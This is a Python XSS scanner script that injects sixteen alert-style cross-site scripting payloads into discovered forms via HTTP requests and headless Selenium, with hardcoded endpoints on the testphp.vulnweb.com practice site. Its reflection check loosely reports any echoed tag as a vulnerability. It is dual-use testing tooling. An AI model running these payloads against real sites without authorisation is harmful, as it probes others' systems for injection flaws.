#!/usr/bin/env python3
"""
Final Advanced XSS Scanner with POST Request Support
"""

import requests
import time
import logging
from urllib.parse import urljoin, urlparse
import re
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, WebDriverException
import json
import os
from datetime import datetime

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler('xss_scan.log')
    ]
)

class FinalPostXSSScanner:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })
        self.vulnerabilities = []
        self.driver = None
        
    def setup_selenium(self):
        """Setup Selenium WebDriver"""
        try:
            chrome_options = Options()
            chrome_options.add_argument('--headless')
            chrome_options.add_argument('--no-sandbox')
            chrome_options.add_argument('--disable-dev-shm-usage')
            chrome_options.add_argument('--disable-gpu')
            chrome_options.add_argument('--window-size=1920,1080')
            chrome_options.add_argument('--disable-web-security')
            chrome_options.add_argument('--allow-running-insecure-content')
            
            self.driver = webdriver.Chrome(options=chrome_options)
            self.driver.set_page_load_timeout(30)
            logging.info("✅ Selenium WebDriver initialized successfully")
            return True
        except Exception as e:
            logging.error(f"❌ Failed to initialize Selenium: {e}")
            return False
    
    def discover_forms(self):
        """Discover forms on the target website"""
        forms = []
        try:
            response = self.session.get(self.target_url, timeout=10)
            if response.status_code == 200:
                # Look for forms in the HTML
                form_pattern = r'<form[^>]*action=["\']?([^"\'>\s]*)["\']?[^>]*method=["\']?([^"\'>\s]*)["\']?[^>]*>(.*?)</form>'
                matches = re.findall(form_pattern, response.text, re.DOTALL | re.IGNORECASE)
                
                for action, method, form_content in matches:
                    if not action:
                        action = self.target_url
                    elif not action.startswith('http'):
                        action = urljoin(self.target_url, action)
                    
                    # Extract input fields
                    input_pattern = r'<input[^>]*name=["\']([^"\'>\s]*)["\'][^>]*>'
                    inputs = re.findall(input_pattern, form_content, re.IGNORECASE)
                    
                    if inputs:
                        forms.append({
                            'action': action,
                            'method': method.upper() if method else 'GET',
                            'inputs': inputs
                        })
                        logging.info(f"🔍 Found form: {action} ({method}) with inputs: {inputs}")
            
            # Add known vulnerable endpoints
            known_forms = [
                {
                    'action': 'http://testphp.vulnweb.com/search.php',
                    'method': 'POST',
                    'inputs': ['searchFor']
                },
                {
                    'action': 'http://testphp.vulnweb.com/guestbook.php',
                    'method': 'POST',
                    'inputs': ['name', 'comment', 'message']
                }
            ]
            
            forms.extend(known_forms)
            logging.info(f"📋 Total forms discovered: {len(forms)}")
            return forms
            
        except Exception as e:
            logging.error(f"❌ Error discovering forms: {e}")
            return []
    
    def generate_payloads(self):
        """Generate XSS payloads"""
        return [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert("XSS")>',
            '<svg onload=alert("XSS")>',
            '<iframe src="javascript:alert(\'XSS\')">',
            '<body onload=alert("XSS")>',
            '<input onfocus=alert("XSS") autofocus>',
            '<details open ontoggle="alert(\'XSS\')">',
            '<video><source onerror="alert(\'XSS\')">',
            '<audio src=x onerror=alert("XSS")>',
            '<object data="javascript:alert(\'XSS\')">',
            '<embed src="javascript:alert(\'XSS\')">',
            '<form><button formaction="javascript:alert(\'XSS\')">',
            '<marquee onstart="alert(\'XSS\')">',
            '<keygen onfocus=alert("XSS") autofocus>',
            '<select onfocus=alert("XSS") autofocus>',
            '<textarea onfocus=alert("XSS") autofocus>'
        ]
    
    def test_with_selenium(self, form, payload):
        """Test XSS with Selenium"""
        try:
            if not self.driver:
                return False
                
            # Navigate to the form page
            self.driver.get(form['action'])
            time.sleep(2)
            
            # Fill form fields
            input_element = None
            for input_name in form['inputs']:
                try:
                    input_element = self.driver.find_element(By.NAME, input_name)
                    input_element.clear()
                    input_element.send_keys(payload)
                    break  # Use the first found input
                except:
                    continue
            
            if not input_element:
                logging.warning(f"⚠️ No input fields found for form: {form['action']}")
                return False
            
            # Submit form
            try:
                submit_button = self.driver.find_element(By.CSS_SELECTOR, 'input[type="submit"], button[type="submit"], button')
                submit_button.click()
            except:
                # Try to submit by pressing Enter
                from selenium.webdriver.common.keys import Keys
                input_element.send_keys(Keys.RETURN)
            
            time.sleep(3)
            
            # Check for alert
            try:
                alert = self.driver.switch_to.alert
                alert_text = alert.text
                alert.accept()
                
                if "XSS" in alert_text:
                    # Take screenshot
                    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                    screenshot_path = f"xss_poc_{timestamp}.png"
                    self.driver.save_screenshot(screenshot_path)
                    
                    vulnerability = {
                        'url': form['action'],
                        'payload': payload,
                        'method': form['method'],
                        'screenshot': screenshot_path,
                        'alert_text': alert_text
                    }
                    
                    self.vulnerabilities.append(vulnerability)
                    logging.info(f"🎯 XSS FOUND! URL: {form['action']}")
                    logging.info(f"💉 Payload: {payload}")
                    logging.info(f"📸 Screenshot: {screenshot_path}")
                    return True
                    
            except:
                pass
            
            return False
            
        except Exception as e:
            logging.error(f"❌ Selenium test error: {e}")
            return False
    
    def test_with_requests(self, form, payload):
        """Test XSS with HTTP requests"""
        try:
            # Prepare data
            data = {}
            for input_name in form['inputs']:
                data[input_name] = payload
            
            # Send request
            if form['method'] == 'POST':
                response = self.session.post(form['action'], data=data, timeout=10)
            else:
                response = self.session.get(form['action'], params=data, timeout=10)
            
            # Check for reflection
            if payload in response.text:
                logging.info(f"✅ Payload reflected in response: {payload}")
                
                # Check if it's in executable context
                if '<script>' in payload and '<script>' in response.text:
                    vulnerability = {
                        'url': form['action'],
                        'payload': payload,
                        'method': form['method'],
                        'reflection': True,
                        'context': 'script'
                    }
                    
                    self.vulnerabilities.append(vulnerability)
                    logging.info(f"🎯 XSS FOUND! URL: {form['action']}")
                    logging.info(f"💉 Payload: {payload}")
                    return True
                elif any(tag in payload for tag in ['<img', '<svg', '<iframe', '<body', '<input', '<details', '<video', '<audio', '<object', '<embed', '<form', '<marquee', '<keygen', '<select', '<textarea']):
                    vulnerability = {
                        'url': form['action'],
                        'payload': payload,
                        'method': form['method'],
                        'reflection': True,
                        'context': 'html'
                    }
                    
                    self.vulnerabilities.append(vulnerability)
                    logging.info(f"🎯 XSS FOUND! URL: {form['action']}")
                    logging.info(f"💉 Payload: {payload}")
                    return True
            
            return False
            
        except Exception as e:
            logging.error(f"❌ Request test error: {e}")
            return False
    
    def scan(self):
        """Main scanning function"""
        logging.info(f"🚀 Starting XSS scan on: {self.target_url}")
        
        # Discover forms
        forms = self.discover_forms()
        if not forms:
            logging.warning("⚠️ No forms found to test")
            return
        
        # Setup Selenium
        selenium_available = self.setup_selenium()
        
        # Generate payloads
        payloads = self.generate_payloads()
        
        # Test each form
        for form in forms:
            logging.info(f"🔍 Testing form: {form['action']}")
            
            for payload in payloads:
                logging.info(f"💉 Testing payload: {payload}")
                
                # Test with requests first
                if self.test_with_requests(form, payload):
                    continue
                
                # Test with Selenium if available
                if selenium_available:
                    if self.test_with_selenium(form, payload):
                        continue
        
        # Cleanup
        if self.driver:
            self.driver.quit()
        
        # Report results
        logging.info(f"📊 Scan completed. Found {len(self.vulnerabilities)} vulnerabilities:")
        for vuln in self.vulnerabilities:
            logging.info(f"🎯 {vuln['url']} - {vuln['payload']}")

def main():
    import sys
    
    if len(sys.argv) != 2:
        print("Usage: python3 final_post_xss_scanner.py <target_url>")
        sys.exit(1)
    
    target_url = sys.argv[1]
    scanner = FinalPostXSSScanner(target_url)
    scanner.scan()

if __name__ == "__main__":
    main()